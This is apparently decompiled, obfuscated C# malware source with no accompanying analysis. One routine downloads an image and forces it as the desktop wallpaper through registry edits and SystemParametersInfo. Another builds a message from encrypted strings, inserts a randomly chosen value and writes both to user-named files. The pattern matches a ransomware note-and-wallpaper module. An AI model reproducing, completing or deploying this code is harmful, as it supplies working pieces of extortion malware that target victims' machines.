using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using _003CPrivateImplementationDetails_003E_007B53EE5BDF_002DC925_002D45D0_002DBB4F_002D1DE255E331E5_007D;
using Microsoft.Win32;

namespace ns0;

internal class Class5
{
	public sealed class Class6
	{
		public enum Enum0
		{
			const_0,
			const_1,
			const_2
		}

		private const int int_0 = 20;

		private const int int_1 = 1;

		private const int int_2 = 2;

		private Class6()
		{
		}

		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		private static extern int SystemParametersInfo(int int_3, int int_4, string string_0, int int_5);

		public static void smethod_0(string string_0, Enum0 enum0_0)
		{
			try
			{
				Stream stream = new WebClient().OpenRead(string_0);
				Image val = Image.FromStream(stream);
				string text = Path.Combine(Path.GetTempPath(), F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_374());
				val.Save(text, ImageFormat.get_Bmp());
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_375(), writable: true);
				if (enum0_0 == Enum0.const_2)
				{
					registryKey.SetValue(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_376(), 2.ToString());
					registryKey.SetValue(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_377(), 0.ToString());
				}
				if (enum0_0 == Enum0.const_1)
				{
					registryKey.SetValue(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_376(), 1.ToString());
					registryKey.SetValue(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_377(), 0.ToString());
				}
				if (enum0_0 == Enum0.const_0)
				{
					registryKey.SetValue(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_376(), 1.ToString());
					registryKey.SetValue(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_377(), 1.ToString());
				}
				SystemParametersInfo(20, 0, text, 3);
			}
			catch
			{
			}
		}
	}

	public static void smethod_0()
	{
		string userName = Environment.UserName;
		string text = F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_63();
		List<string> list = new List<string>
		{
			F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_64(),
			F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_65(),
			F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_66(),
			F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_67(),
			F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_68(),
			F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_69(),
			F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_70(),
			F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_71(),
			F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_72(),
			F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_73()
		};
		Random random = new Random();
		int index = random.Next(list.Count);
		Class7.string_3 = list[index];
		list.RemoveAt(index);
		string text2 = Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_74(), Class7.byte_4, Class7.byte_3) + Environment.NewLine + Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_75(), Class7.byte_4, Class7.byte_3) + Environment.NewLine + Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_76(), Class7.byte_4, Class7.byte_3) + Environment.NewLine + Environment.NewLine + Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_77(), Class7.byte_4, Class7.byte_3) + Environment.NewLine + Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_78(), Class7.byte_4, Class7.byte_3) + Environment.NewLine + Environment.NewLine + Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_79(), Class7.byte_4, Class7.byte_3) + Environment.NewLine + Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_80(), Class7.byte_4, Class7.byte_3) + Environment.NewLine + Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_81(), Class7.byte_4, Class7.byte_3) + Environment.NewLine + Environment.NewLine + Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_82(), Class7.byte_4, Class7.byte_3) + Environment.NewLine + Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_83(), Class7.byte_4, Class7.byte_3) + Environment.NewLine + Environment.NewLine + Environment.NewLine + Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_84(), Class7.byte_4, Class7.byte_3) + Class7.string_3 + Environment.NewLine + Environment.NewLine + Environment.NewLine + Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_85(), Class7.byte_4, Class7.byte_3) + Environment.NewLine + Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_86(), Class7.byte_4, Class7.byte_3) + Environment.NewLine + Class4.smethod_10(F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_87(), Class7.byte_4, Class7.byte_3);
		string text3 = F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_88();
		string path = text + userName + text3;
		string path2 = text + userName + F7DED4E4_002D5E7F_002D4D25_002D959D_002D6841FAE1D61E.smethod_89();
		string[] contents = new string[1] { Class7.string_3 };
		string[] contents2 = new string[1] { text2 };
		File.WriteAllLines(path, contents2);
		File.WriteAllLines(path2, contents);
		Class7.string_3 = null;
	}
}
